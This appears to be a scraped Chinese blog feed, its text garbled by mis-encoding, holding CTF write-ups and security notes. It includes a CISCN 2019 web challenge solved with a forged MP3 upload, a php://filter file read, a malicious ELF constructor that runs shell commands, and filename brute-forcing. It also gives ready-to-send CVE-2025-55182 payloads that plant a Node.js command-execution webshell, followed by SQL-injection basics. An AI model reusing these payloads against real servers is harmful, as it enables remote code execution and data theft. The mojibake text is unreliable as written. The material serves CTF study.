12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python3 # coding:utf-8 # ä¸“ä¸º Python3 ç¼–å†™ï¼Œæ— ä»»ä½•ç¼–ç /æ‹¼æ¥æŠ¥é”™ def flat(*args): &quot;&quot;&quot;å­—èŠ‚æµæ‹¼æ¥å‡½æ•°ï¼ˆä»…å¤„ç†å­—èŠ‚ç±»å‹ï¼Œå½»åº•é¿å…ç±»å‹é”™è¯¯ï¼‰&quot;&quot;&quot; result = b&quot;&quot; for arg in args: if isinstance(arg, bytes): result += arg else: # å¼ºåˆ¶è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆç¡®ä¿æ‰€æœ‰è¾“å…¥ç»Ÿä¸€ç±»å‹ï¼‰ raise TypeError(f&quot;ä»…æ”¯æŒ bytes ç±»å‹ï¼Œä¼ å…¥äº† {type(arg)}&quot;) return result # 1. æŒ‰ä½ æä¾›çš„ç»“æ„ï¼Œæ‰€æœ‰å†…å®¹è½¬ä¸º bytes ç±»å‹ï¼ˆæ ¸å¿ƒä¿®æ”¹ï¼‰ mp3_tag = flat( b'ID3', # æ ‡ç­¾æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x03', # ä¸»ç‰ˆæœ¬å·ï¼ˆbytesï¼‰ b'\\x00', # ä¿®è®¢å·ï¼ˆbytesï¼‰ b'\\x00', # æ ‡å¿—ä½ï¼ˆbytesï¼‰ b'\\x00\\x00\\x04\\x00', # æ ‡ç­¾å¤´å¤§å°ï¼ˆbytesï¼‰ b'TIT2', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TIT2 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TIT2 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'a'*9 + b'\\x00', # TIT2 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'a' + ç»“æŸç¬¦ï¼‰ b'TPE1', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TPE1 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TPE1 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'b'*9 + b'\\x00', # TPE1 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'b' + ç»“æŸç¬¦ï¼‰ b'TALB', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x02\\xff', # TALB å¸§å¤§å°ï¼ˆbytesï¼ŒæŒ‰ä½ æä¾›çš„é…ç½®ï¼‰ b'\\x00\\x00', # TALB å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'c'*0x200 + b'\\x00', # TALB å†…å®¹ï¼ˆbytesï¼Œ512ä¸ª'c' + ç»“æŸç¬¦ï¼‰ ) # 2. æ·»åŠ æ ‡å‡† MP3 éŸ³é¢‘å¸§ï¼ˆç¡®ä¿æ–‡ä»¶è¢«è¯†åˆ«ä¸ºæœ‰æ•ˆ MP3ï¼Œä¸æŠ¥é”™ï¼‰ # æ ‡å‡† MPEG-1 Layer 3 éŸ³é¢‘å¸§ï¼ˆ44.1kHz å•å£°é“ï¼Œ128kbpsï¼ŒæŒç»­0.5ç§’ï¼‰ mp3_audio = ( b'\\xff\\xf3\\xc4\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' ) # 3. æ‹¼æ¥æ ‡ç­¾ + éŸ³é¢‘ï¼Œç”Ÿæˆå®Œæ•´ MP3 æ–‡ä»¶ full_mp3 = mp3_tag + mp3_audio # 4. å†™å…¥æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ¨¡å¼ï¼ŒPython3 æ ‡å‡†å†™æ³•ï¼‰ output_file = &quot;fake_mp3_no_error.mp3&quot; with open(output_file, &quot;wb&quot;) as f: f.write(full_mp3) print(f&quot;âœ… é›¶æŠ¥é”™ï¼ä¼ªé€  MP3 å·²ç”Ÿæˆï¼š{output_file}&quot;) print(f&quot;ğŸ“Œ æ ‡ç­¾ç»“æ„å®Œå…¨æŒ‰ä½ çš„é…ç½®ï¼šID3v2.3 + TIT2/TPE1/TALB å¸§&quot;) print(f&quot;ğŸµ åŒ…å«æœ‰æ•ˆéŸ³é¢‘å¸§ï¼Œå¯æ­£å¸¸æ’­æ”¾/ä¸Šä¼ ç»•è¿‡&quot;) å¾—åˆ°å¯†ç wc4I22tosZFIsUIk ç”¨adminç™»å½•è¿›å» ä¹Ÿæ˜¯æˆåŠŸç™»å½•äº† æ¥åˆ°/#firmwareé¡µé¢ è¿™é‡Œè€æ–¹æ³•è¯»å–ä¸€ä¸‹frimwareä»£ç  1curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#firmware.php&lt;?phpif (!isset($_SESSION['user'])||strlen($_SESSION['user'])&lt;=0){ ob_end_clean(); header('Location: /hotload.php?page=login&amp;err=1'); die();}if ($_SESSION['role']!='admin'){ $padding='Lorem ipsum dolor sit amet, consectetur adipisicing elit.'; for($i=0;$i&lt;10;$i++) $padding.=$padding; die('&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;åªæœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½è®¿é—®ï¼&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;'.$padding.'&lt;/p&gt;&lt;/div&gt;');}if (isset($_FILES[&quot;file_data&quot;])){ if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼Œå›ºä»¶æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); }else{ mt_srand(time()); $firmware_filename=md5(mt_rand().$_SESSION['user']); $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;; if (time()-$_SESSION['timestamp']&lt;3){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'æ“ä½œå¤ªå¿«äº†ï¼Œè¯·ç¨åå†ä¸Šä¼ ã€‚'))); } $_SESSION['timestamp']=time(); move_uploaded_file($_FILES[&quot;file_data&quot;][&quot;tmp_name&quot;], $firmware_filename); $handle = fopen($firmware_filename, &quot;rb&quot;); if ($handle==FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼ŒæœªçŸ¥åŸå› ã€‚'))); } $flags = fread($handle, 4); fclose($handle); if ($flags!==&quot;\\x7fELF&quot;){ unlink($firmware_filename); ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼Œä¸æ˜¯æœ‰æ•ˆçš„ ELF æ–‡ä»¶ã€‚'))); } ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'ä¸Šä¼ æˆåŠŸï¼'))); }}else{ if (isset($_SERVER['CONTENT_TYPE'])){ if (stripos($_SERVER['CONTENT_TYPE'],'form-data')!=FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼ŒéŸ³ä¹æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); } }}@$path=$_POST['path'];function clean_string($str){ $str=str_replace(&quot;\\\\&quot;,&quot;&quot;,$str); $str=str_replace(&quot;/&quot;,&quot;&quot;,$str); $str=str_replace(&quot;.&quot;,&quot;&quot;,$str); $str=str_replace(&quot;;&quot;,&quot;&quot;,$str); return substr($str,0,32);}if (isset($path)){ $path=clean_string(trim((string) $path)); if (strlen($path)&lt;=0||strlen($path)&gt;64){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'è¾“å…¥æ ¼å¼æˆ–é•¿åº¦ä¸ç¬¦åˆè§„å®šï¼'))); }else{ $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;; if (!file_exists($firmware_filename)){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'å›ºä»¶æ–‡ä»¶ä¸å­˜åœ¨ï¼'))); }else{ try{ $elf = FFI::cdef(&quot; extern char * version; &quot;, $firmware_filename); $version=(string) FFI::string($elf-&gt;version); ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'å›ºä»¶ç‰ˆæœ¬å·ï¼š'.$version))); }catch(Error $e){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'åŠ è½½å›ºä»¶æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼'))); } } }}?&gt;&lt;script&gt;nav_active();nav_user('&lt;?php echo @$_SESSION['user']; ?&gt;');&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput-rtl.min.css&quot;&gt; &lt;script src=&quot;js/fileinput.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/locales/zh.js&quot;&gt;&lt;/script&gt; &lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt; &lt;h3 style=&quot;margin-bottom:15px;&quot;&gt;å›ºä»¶æ›´æ–°&lt;/h3&gt; &lt;input id=&quot;upload&quot; type=&quot;file&quot; class=&quot;file&quot; data-preview-file-type=&quot;text&quot; &gt; &lt;div style=&quot;height:30px&quot;&gt;&lt;/div&gt; &lt;div id=&quot;info1&quot; class=&quot;alert&quot; role=&quot;alert&quot; style='display: none;'&gt;&lt;/div&gt; &lt;script&gt; $(&quot;#upload&quot;).fileinput({language: 'zh',uploadUrl: '/hotload.php?page=firmware'}); $(&quot;#upload&quot;).on(&quot;fileuploaded&quot;, function (event, data, previewId, index) { var data = data.response; if (data.status==1){ $('#info1').removeClass('alert-danger'); $('#info1').addClass('alert-success'); }else{ $('#info1').removeClass('alert-success'); $('#info1').addClass('alert-danger'); } $('#info1').html(data.info); $('#info1').show(); }); &lt;/script&gt; &lt;hr/&gt;&lt;h4 style=&quot;text-align:left;margin-bottom:15px;color:gray;&quot;&gt;è°ƒè¯•æ¨¡å¼ï¼ˆè¯»å–å›ºä»¶ç‰ˆæœ¬å·)&lt;/h4&gt; &lt;div class='form-container'&gt; &lt;div class='form-group'&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;å›ºä»¶æ–‡ä»¶&quot; id=&quot;path&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;button class=&quot;btn btn-info btn-block&quot; onclick=&quot;submit()&quot;&gt;è¯»å–&lt;/button&gt; &lt;/div&gt; &lt;div id=&quot;info2&quot; class=&quot;alert&quot; role=&quot;alert&quot; style=&quot;display: none;&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;function submit(){ $('#info2').hide(); $.ajax({ type: 'POST', url: &quot;/hotload.php?page=firmware&quot;, data: {path: $('#path').val()}, dataType: &quot;json&quot;, success: function(data) { if (data.status==1){ $('#info2').removeClass('alert-danger'); $('#info2').addClass('alert-success'); }else{ $('#info2').removeClass('alert-success'); $('#info2').addClass('alert-danger'); } $('#info2').html(data.info); $('#info2').show(); } });}&lt;/script&gt; &lt;p style=&quot;visibility: hidden&quot;&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates? &lt;/p&gt; &lt;/div&gt; åœ¨#firmwareä¸Šä¼ elf 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char _version[0x130];char *version = _version;__attribute__((constructor)) void fun() { memset(version, 0, 0x130); FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;); if (fp == NULL) return; fread(version, 1, 0x100, fp); pclose(fp);} ç¼–è¯‘æˆelfä¸Šä¼ å°±å¯ä»¥äº† çˆ†ç ´æ–‡ä»¶å 123456789101112131415161718192021222324&lt;?php function generate_filenames($start_time, $end_time, $user) { $results = []; for ($time = $start_time; $time &lt;= $end_time; $time++) { mt_srand($time); $rand = mt_rand(); $filename = md5($rand . $user); $results[] = $filename; } return $results; } // å·²çŸ¥ä¿¡æ¯ $user = &quot;admin&quot;; // å›ºå®šå€¼ $date = strtotime(&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;); // å·²çŸ¥æ—¶é—´ $time_range = 100; // æ—¶é—´åç§»èŒƒå›´ Â±100 ç§’ // å¼€å§‹æš´åŠ›ç ´è§£ $start_time = $date - $time_range; $end_time = $date + $time_range; $possible_filenames = generate_filenames($start_time, $end_time, $user); foreach ($possible_filenames as $filename) { echo $filename . &quot;.elf\\n&quot;; } ?&gt; å»æµè§ˆå™¨å¤åˆ¶æ—¶é—´å»çˆ†ç ´å°±è¡Œäº†ç„¶åæŠŠå­—å…¸å¤åˆ¶åˆ°bpé‡Œé¢çˆ†å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}","link":"/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90%20(2)/"},{"title":"","text":"jså†…å­˜é©¬-CVE-2025-55182 ç‰ˆæœ¬1ä¸çŸ¥é“æ˜¯å¤ªé•¿äº†è¿˜æ˜¯ä»€ä¹ˆåŸå›  1234567891011121314{ &quot;then&quot;: &quot;$1:__proto__:then&quot;, &quot;status&quot;: &quot;resolved_model&quot;, &quot;reason&quot;: -1, &quot;value&quot;: &quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;, &quot;_response&quot;: { &quot;_prefix&quot;: &quot;(async()=&gt;{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/deep'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=&gt;{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();&quot;, &quot;_chunks&quot;: &quot;$Q2&quot;, &quot;_formData&quot;: { &quot;get&quot;: &quot;$1:constructor:constructor&quot; } }}{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}} CVE-2025-55182 æ˜¥ç§‹äº‘é•œå¤ç° 123456789101112131415161718POST /apps HTTP/2Host: eci-2zeiverm334jp4jylqln.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0Accept-Encoding: gzip, deflateNext-Action: xX-Nextjs-Request-Id: test123Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryContent-Length: 594------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;0&quot;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}}------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;1&quot;&quot;$@0&quot;------WebKitFormBoundary-- è®¿é—®è·å–flag 1/deep?cmd=cd%20../../;cat%20/flag","link":"/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"},{"title":"","text":"sqlåŸºç¡€ 1.ä»€ä¹ˆæ˜¯æ³¨å…¥ï¼Ÿæ³¨å…¥å°±æ˜¯é€šè¿‡SQLå‘½ä»¤æ’å…¥åˆ°webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆåˆ°è¾¾æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLä»£ç ï¼Œä»è€Œè¿›ä¸€æ­¥å¾—åˆ°ç›¸åº”çš„æ•°æ®ä¿¡æ¯ æ„é€ ä¸€æ¡ç²¾å·§çš„è¯­å¥ï¼Œæ¥æŸ¥è¯¢åˆ°æƒ³è¦å¾—åˆ°çš„ä¿¡æ¯ã€‚ 2.æ³¨å…¥æœ‰å“ªå‡ ç§åˆ†ç±»æŒ‰ç…§æŸ¥è¯¢å­—æ®µ æŒ‰ç…§æ³¨å…¥çš„æ–¹å¼ï¼šunionæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”æ³¨å…¥ï¼Œæ—¶é—´æ³¨å…¥ 3.ä»€ä¹ˆæ˜¯æ³¨å…¥ç‚¹æ³¨å…¥ç‚¹å°±æ˜¯å¯ä»¥å®è¡Œæ³¨å…¥çš„åœ°æ–¹ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè®¿é—®æ•°æ®åº“çš„è¿æ¥ã€‚å¦‚æœ¬é¡µé¢æ³¨å…¥ç‚¹input the ID 4.å¦‚ä½•åˆ¤æ–­æ˜¯ä»¥ä»€ä¹ˆç±»å‹æ³¨å…¥å¦‚ä½•åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ–¹æ³•ä¸€ï¼šand 1=1å’Œand 1=2æ¥åˆ¤æ–­ å­—ç¬¦å‹æ•°å­—å‹and 1=1å’Œand 1=2éƒ½å‡ºç°æ­£å¸¸æç¤ºé¡µé¢ï¼Œåˆ™ä¸å¯èƒ½æ˜¯æ•°å­—å‹æ³¨å…¥å½“ä½ æ˜¯æ•°å­—å‹çš„æ—¶å€™è¿™ä¸ªid 1=2æ˜¯ä¸èƒ½æ­£å¸¸æ‰§è¡Œçš„ æ–¹æ³•äºŒï¼š 1?id=2-1 å­—ç¬¦å‹æ˜¯ä¸åšè¿ç®—çš„ï¼ŒæŸ¥å‡ºæ¥ä»»ç„¶æ˜¯2æ•°å­—å‹æ˜¯ä¼šåšè¿ç®—çš„ è¿™é‡Œä¸€èˆ¬ä¸ç”¨+å·ï¼Œ+å·æœ‰æ—¶å€™ä¼šè¢«ç†è§£æˆç©ºæ ¼ 5.é—­åˆæ–¹å¼æ˜¯ä»€ä¹ˆå­—ç¬¦å‹éœ€è¦é—­åˆç¬¦ï¼Œå¦‚ä¸‹æ‰€ç¤º 1$scl=&quot;select * from users where id='$id' limit 0,1&quot;; æäº¤ 1=and 1=1 1$scl=&quot;select * from users where id='1 and 1=1' limit 0,1&quot;; é‡Œé¢çš„å‘½ä»¤ä¸ä¼šå½“æˆå‘½ä»¤æ¥æ‰§è¡Œ æ•°å­—å‹åˆ™ä¸éœ€è¦é—­åˆç¬¦æ¥é—­åˆ 1$scl=&quot;select * from users where id=$id limit 0,1&quot;; æäº¤ and 1=2 1$scl=&quot;select * from users where id=$id and 1=2 limit 0,1&quot;; 6.å¦‚ä½•åˆ¤æ–­é—­åˆæ–¹å¼åˆ†ææŠ¥é”™è¿™é‡Œè¾“å…¥2â€™å‘ç°å¤šäº†ä¸€ä¸ªå•å¼•å·æŠ¥é”™äº† 7.é—­åˆçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ‰‹å·¥æäº¤é—­åˆç¬¦å·ï¼Œç»“æŸå‰ä¸€æ®µæŸ¥è¯¢è¯­å¥ï¼Œåé¢å³å¯åŠ å…¥å…¶ä»–è¯­å¥ï¼ŒæŸ¥è¯¢éœ€è¦çš„å‚æ•°ä¸éœ€è¦çš„è¯­å¥å¯ä»¥ç”¨æ³¨é‡Šç¬¦å·â€˜-+â€™æˆ–â€˜#æˆ–%23æ³¨é‡Šæ‰æ³¨é‡Šæ‰ï¼šåˆ©ç”¨æ³¨é‡Šç¬¦å·æš‚æ—¶å°†ç¨‹åºæ®µè„±ç¦»è¿è¡Œã€‚æŠŠæŸæ®µç¨‹åºâ€œæ³¨é‡Šæ‰â€ï¼Œå°±æ˜¯è®©å®ƒæš‚æ—¶ä¸è¿è¡Œï¼ˆè€Œéåˆ é™¤æ‰ï¼‰ 8.ä»€ä¹ˆæ˜¯unionè”åˆæ³¨å…¥è”åˆæŸ¥è¯¢æ³¨å…¥ 1?id=1' union select database ()--+ ä¸Šé¢ä¼šæŠ¥é”™å…ˆåˆ¤æ–­å‰é¢çš„åˆ—æ•°,å¦‚ä¸‹è¯­å¥åˆ¤æ–­ 1234?id=1' group by 3 --+æˆ–è€…?id=1' order by 3 --+?id=1' union select 1,2,3 --+ UNION è¦æ±‚å‰åä¸¤ä¸ªæŸ¥è¯¢çš„å­—æ®µæ•°é‡å¿…é¡»ä¸€è‡´æŸ¥è¯¢ä¸‰ä¸ªå¸¸é‡å€¼ 1,2,3åªä¼šè¯»å–ç¬¬ä¸€è¡ŒæŠŠå®ƒè¯»å–å‡ºæ¥ï¼Œç„¶åæŠŠé‚£ä¸ª1ä¿®æ”¹æˆ-1å³å¯ 1?id=-1' union select 1,2,3 --+ 1?id=-1' union select 1,version(),database() --+ 1.å…ˆæŸ¥æ‰¾æ³¨å…¥ç‚¹2.åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ and 1=1 1=2/ 3-13.å¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œåˆ¤æ–­é—­åˆæ–¹å¼ ' &quot; ') &quot;)4.åˆ¤æ–­æŸ¥è¯¢åˆ—æ•°ï¼Œgroup by order by5.æŸ¥è¯¢å›æ˜¾ä½ ?id=-1 'union select 1,2,3--+ sqlå‰ç½®1234cd D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\Extensions\\MySQL5.7.26\\binmysql -u root -p -P 8848//rootæ˜¯æ•°æ®åº“åå­— å¦‚æœä¿®æ”¹äº†phpstudyé‡Œçš„sqlç«¯å£è¦åœ¨phpadminå¦‚ä¸‹è·¯å¾„ä¸‹çš„ 12D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\phpadmin\\phpMyAdmin4.8.5\\librariesconfig.default.php ç„¶åä¿®æ”¹æˆsqlçš„ç«¯å£ mysqlå¢åˆ æ”¹12345678910111213# ç™»å½• MySQLï¼ˆroot ç”¨æˆ·ï¼Œ-p åä¸ç›´æ¥å†™å¯†ç æ›´å®‰å…¨ï¼‰mysql -u root -p# æç¤ºè¾“å…¥å¯†ç æ—¶ï¼Œè¾“å…¥æ­£ç¡®å¯†ç åå›è½¦# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼ˆSQL å‘½ä»¤éœ€ä»¥åˆ†å·ç»“å°¾ï¼‰show databases;# åˆ›å»ºæ•°æ®åº“ employeesï¼ŒæŒ‡å®šå­—ç¬¦é›†ä¸º utf8ï¼ˆæ³¨æ„ï¼šutf8mb4 æ›´æ¨èï¼Œæ”¯æŒå®Œæ•´ Unicodeï¼‰create database employees charset utf8;# æˆ–æ›´æ¨èï¼šcreate database employees charset utf8mb4;# åˆ é™¤æ•°æ®åº“ employeesï¼ˆå±é™©æ“ä½œï¼Œä¼šç›´æ¥åˆ é™¤æ‰€æœ‰æ•°æ®ï¼‰drop database employees; 12use employees;#ä½¿ç”¨æ•°æ®åº“ 1234567891011121314151617181920212223242526CREATE TABLE è¡¨å ( å­—æ®µ1 æ•°æ®ç±»å‹ [çº¦æŸæ¡ä»¶], å­—æ®µ2 æ•°æ®ç±»å‹ [çº¦æŸæ¡ä»¶], ...);CREATE TABLE employee ( id int, name varchar(40), sex char(4), birthday date, job varchar(100));#æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯show full columns from employee;#æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨select from employee;#åˆ é™¤æ•°æ®è¡¨drop table employee;#ä¿®æ”¹æ•°æ®è¡¨åç§°ä¸ºuserrename table employee to user;#ä¿®æ”¹å­—ç¬¦çº§alter table user character set utf8; 12345678910111213insert into user(id, name, sex, birthday, job)values(1, 'ctfstu', 'male', '1999-05-06', 'it');#å†™å…¥å†…å®¹INSERT INTO users (id, name, sex, birthday, job)VALUES (1, 'ctfstu', 'male', '1999-05-06', 'it'); 1select * from user; æŸ¥çœ‹è¡¨ 123alter table user add salary decimal(8,2);#å¢åŠ ä¸€åˆ— ç¬¬ä¸€ä¸ªæ•°å­— 8 è¡¨ç¤º æ€»ä½æ•°ï¼ˆæ•´æ•°éƒ¨åˆ† + å°æ•°éƒ¨åˆ†çš„æ€»é•¿åº¦ä¸èƒ½è¶…è¿‡ 8 ä½ï¼‰ã€‚ ç¬¬äºŒä¸ªæ•°å­— 2 è¡¨ç¤º å°æ•°éƒ¨åˆ†çš„ä½æ•°ï¼ˆå›ºå®šä¿ç•™ 2 ä½å°æ•°ï¼Œä¾‹å¦‚ 12345.67 æ˜¯åˆæ³•çš„ï¼Œ123456.78 åˆ™è¶…è¿‡æ€»ä½æ•°é™åˆ¶ï¼‰ã€‚ 12345å¢åŠ ä¸€è¡ŒINSERT INTO user (id, name, sex, birthday, job)VALUES (10, 'xiaohong', 'female', '2006-03-15', 'designer');update user set salary=5000;#å°†æ‰€æœ‰salaryå€¼è®¾ç½®ä¸º5000 123update user set name='benben' where id=1;#å°†id=1çš„è¡Œnameä¿®æ”¹ä¸ºbenben 123update user set name='benben2',salary=6000 where id=1;#ä¿®æ”¹id=1çš„è¡Œnameä¸ºbenben2,å·¥èµ„ä¸º6000 123456789alter table user drop salary;#åˆ é™¤salaryåˆ—delete from user where job='it';#åˆ é™¤æŸä¸€è¡Œdelete from user;#åˆ é™¤userè¡¨ æ•°æ®åº“æŸ¥è¯¢1234567891011121314INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it');#å†åŠ å¤šè¡Œ 123select * from user where id=1;#select+åˆ—å(*ä»£è¡¨æ‰€æœ‰)from+è¡¨å where+æ¡ä»¶è¯­å¥ 1234567select * from user where id in ('3');#ä»userè¡¨æŸ¥è¯¢æ‰€æœ‰idä¸º3,å’Œä¸Šé¢ä¸€æ ·çš„æ•ˆæœselect * from user where id=(select id from user where name=('admin'));#å­æŸ¥è¯¢ï¼Œä¼˜å…ˆæŸ¥è¯¢æ‹¬å·é‡Œé¢çš„#ä¸€èˆ¬ç”¨åœ¨ä¸çŸ¥é“idåªçŸ¥é“nameä¸ºadminçš„æŸ¥è¯¢ 1234567select id from user union select email_id from emailsselect from user where id=6 union select from emails where id=6;#ERROR:have a different number of columnsè”åˆæ³¨å…¥å‰åè¡¨æ ¼åˆ—æ•°å¿…é¡»ç›¸ç­‰select * from users where id=6 union select *,3 from emails where id=6;#3ä¸ºå¡«å……åˆ— emails è¡¨æœ¬èº«åªæœ‰ 2 ä¸ªå­—æ®µï¼ŒSELECT * FROM emails... 